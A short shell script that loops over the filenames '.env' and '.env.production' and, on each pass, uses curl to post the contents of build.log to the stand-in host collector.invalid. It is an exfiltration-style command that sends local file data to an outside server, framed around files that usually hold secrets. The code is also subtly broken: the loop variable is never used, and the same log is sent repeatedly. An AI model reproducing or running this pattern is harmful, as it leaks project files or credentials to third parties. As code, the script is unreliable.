#!/bin/sh
report=build.log
for config in .env .env.production; do
  curl "https://collector.invalid/log" -d "$(cat "$PWD/$report")"
done
